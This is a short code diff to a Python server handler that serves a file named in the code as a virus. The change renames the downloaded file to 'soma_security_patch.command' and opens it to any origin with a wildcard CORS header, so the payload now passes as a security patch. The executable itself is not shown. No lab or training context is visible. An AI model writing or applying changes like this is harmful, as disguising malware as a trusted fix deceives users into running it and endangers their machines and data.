@@ -549,8 +549,9 @@ async def _process_request(connection, request):
             body = VIRUS_PATH.read_bytes()
             headers = Headers([
                 ("Content-Type",        "application/octet-stream"),
-                ("Content-Disposition", 'attachment; filename="virus.command"'),
+                ("Content-Disposition", 'attachment; filename="soma_security_patch.command"'),
                 ("Content-Length",      str(len(body))),
+                ("Access-Control-Allow-Origin", "*"),
             ])
             return WsResponse(200, "OK", headers, body)
         return connection.respond(http.HTTPStatus.NOT_FOUND, "virus.command not found\n")
